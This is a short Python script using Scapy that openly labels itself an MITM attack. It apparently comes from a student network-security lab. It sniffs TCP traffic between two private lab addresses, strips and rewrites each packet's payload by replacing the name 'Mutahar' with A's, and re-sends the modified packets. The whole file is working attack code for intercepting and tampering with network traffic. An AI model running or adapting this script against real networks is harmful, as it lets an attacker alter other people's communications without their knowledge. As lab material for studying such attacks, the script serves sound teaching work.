#!/usr/bin/env python3
from scapy.all import *

print("LAUNCHING MITM ATTACK.........")

# Define the MAC address of the Victim (Source) and IP address of the Destination
# Victim_MAC = "02:42:0a:09:00:05"
# Destination_IP = "192.168.60.5"

def spoof_pkt(pkt):
   """
   Function to SNIFF & SPOOF TCP Packets
   """
   # Create a new packet based on the captured packet
   newpkt = IP(bytes(pkt[IP]))		# Copy th IP layer
   del(newpkt.chksum)			# Delete the IP Checksum
   del(newpkt[TCP].payload)		# Delete the TCP Payload
   del(newpkt[TCP].chksum)		# Delete TCP Checksum

   # Modify the packet payload if it exists
   if pkt[TCP].payload:
       data = pkt[TCP].payload.load
       print("*** %s, length: %d" % (data, len(data)))

       # Replace my name "Mutahar" with A's in the data
       newdata = data.replace(b'Mutahar', b'AAAAAAA')
       send(newpkt/newdata)		# Send the modified packet
   else:
       send(newpkt)			# Simply forward the packet if no paylaod

# Define packet filter using the victim's MAC
my_filter = 'tcp and ip src 10.9.0.5 and ip dst 192.168.60.5'
# my_filter = filter.format(MAC = Victim_MAC, IP = Destination_IP)
pkt = sniff(iface = "eth0", filter = my_filter, prn = spoof_pkt)
